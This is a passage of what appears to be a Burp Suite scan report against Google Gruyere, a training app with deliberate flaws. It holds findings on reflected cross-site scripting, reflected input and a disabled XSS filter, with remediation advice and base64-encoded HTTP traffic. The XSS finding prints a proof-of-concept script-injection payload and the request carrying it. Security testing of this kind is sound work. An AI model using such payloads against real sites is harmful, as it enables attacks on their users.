lZW4gb2YgdGhlIGNoZWVzZXM8c3BhbiBzdHlsZT1jb2xvcjpyZWQ+ISEhPC9zcGFuPjwvc3Bhbj4KICAgIDxicj4KICAgICAgICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1icmllJz5BbGwgc25pcHBldHM8L2E+Jm5ic3A7CiAgICAgIDxhIGhyZWY9J2h0dHBzOi8vbmV3cy5nb29nbGUuY29tL25ld3Mvc2VhcmNoP3E9YnJpZSc+SG9tZXBhZ2U8L2E+CiAgICA8YnI+CiAgICA8YnI+CiAgICA8L3RkPgogIDwvdHI+CgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOmJsdWUnPkNoZWRkYXIgTWFjPC9zcGFuPjwvYj4KICAgIDwvdGQ+CiAgICA8dGQgd2lkdGg9JzEwMCUnPjxzcGFuIGlkPSdjaGVkZGFyJz5HcnV5ZXJlIGlzIHRoZSBjaGVlc2llc3QgYXBwbGljYXRpb24gb24gdGhlIHdlYi48L3NwYW4+CiAgICA8YnI+CiAgICAgICAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bD91aWQ9Y2hlZGRhcic+QWxsIHNuaXBwZXRzPC9hPiZuYnNwOwogICAgICA8YSBocmVmPSdodHRwczovL2ltYWdlcy5nb29nbGUuY29tLz9xPWNoZWRkYXIrY2hlZXNlJz5Ib21lcGFnZTwvYT4KICAgIDxicj4KICAgIDxicj4KICAgIDwvdGQ+CiAgPC90cj4KCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCjwvdGFibGU+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>88812177668477676</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/logout]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/logout [URL path filename]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the HTML document as plain text between tags. The payload <b>pp5de&lt;script&gt;alert(1)&lt;/script&gt;mv5j3</b> was submitted in the URL path filename. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0cHA1ZGUlM2NzY3JpcHQlM2VhbGVydCgxKSUzYy9zY3JpcHQlM2VtdjVqMyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYTQ0OGE5ZGRjM2UyYmY0MTE3ZGEwZTRmNDA2NWVjNTgNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0Mzo0MyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY2Ng0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL2xvZ291dHBwNWRlPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pm12NWozPC9kaXY+CgoKPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>55744138964907008</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/logout]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/logout [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0bmdidWw1a3Y4aiBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogMDA3MmVjN2Q5ZjVjOGYxNTE2NGI4YjA3NjU4MGI2ZGMNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MzoyNSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY0MQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL2xvZ291dG5nYnVsNWt2OGo8L2Rpdj4KCgo8L2JvZHk+Cgo8L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1586807164675690496</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNTJjM2NjZWZhNmI4NWZmNjEwNDkyNTUxMGRlM2YzNGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDoxNiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzM2MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6